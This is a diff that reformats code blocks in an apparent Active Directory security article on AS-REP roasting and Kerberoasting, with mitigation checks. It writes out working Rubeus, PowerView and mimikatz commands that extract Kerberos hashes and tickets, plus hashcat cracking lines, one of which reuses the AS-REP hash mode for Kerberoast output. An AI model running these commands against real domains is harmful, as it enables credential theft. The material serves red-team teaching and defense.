@@ -57,22 +57,30 @@ This results in any user who has the correct name of that account to be able to 
 
 We can use [Rubeus](https://github.com/GhostPack/Rubeus) on a domain joined machine to find all accounts on that domain where **Do not require Kerberos preauthentication** is set and have it return the corresponding hashes. The **/format** option will directly give us output that is crackable with [hashcat](https://github.com/hashcat/hashcat).
 
-````Rubeus.exe asreproast /format:hashcat````
+```powershell
+Rubeus.exe asreproast /format:hashcat
+```
 
 The AS-REP hash can then be fed into hashcat for offline attacks i.e. with brute-force or wordlist attacks.
 
-````hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\rockyou.txt````
+```powershell
+hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\rockyou.txt
+```
 
 
 ### Mitigation
 
 To check which accounts in you environment have pre-authentication disabled, you can use the following powershell cmdlet, which should be available by default on domain joined machines:
 
-````get-aduser -filter * -properties DoesNotRequirePreAuth | where {$._DoesNotRequirePreAuth -eq "True" -and $_.Enabled -eq "True"} | select Name````
+```powershell
+get-aduser -filter * -properties DoesNotRequirePreAuth | where {$._DoesNotRequirePreAuth -eq "True" -and $_.Enabled -eq "True"} | select Name
+```
 
 Or you might want to run [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) in your powershell session and issue the Get-DomainUser cmdlet:
 
-````Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose````
+```powershell
+Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
+```
 
 You should make sure that every account is using pre-authentication.  
 If for some reason an account needs to have it disabled, it all comes down to password complexity and length.
@@ -101,16 +109,22 @@ The attacker can intercept or extract the ticket from memory, and crack the hash
 **Rubeus**  
 The following attack will try to roast all users on the current domain leaving us with hashes in a crackable format for hashcat:  
 
-````Rubeus.exe kerberoast /format:hashcat````
+```powershell
+Rubeus.exe kerberoast /format:hashcat
+```
 
 **PowerView**  
 We can get a list of all user accounts that have a **SPN** set:  
 
-````Get-DomainUser -SPN````
+```powershell
+Get-DomainUser -SPN
+```
 
 Afterwards we can fetch the hashes like so:  
 
-````Get-DomainSPNTicket -SPN <spn> -OutputFormat hashcat````
+```powershell
+Get-DomainSPNTicket -SPN <spn> -OutputFormat hashcat
+```
 
 **mimikatz**  
 mimikatz can be used to extract **STs** from memory. But beforehand you will have to identify **SPNs** and ask for tickets for them.  
@@ -123,11 +137,15 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –Argumen
 ```
 
 In order to extract the ticket from memory we use mimikatz: 
-````kerberos::list /export````
+```powershell
+kerberos::list /export
+```
 
 **hashcat**  
 The output from Rubeus and PowerView can directly be feeded into hashcat:  
-````hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\rockyou.txt````
+```powershell
+hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\rockyou.txt
+```
 
 
 
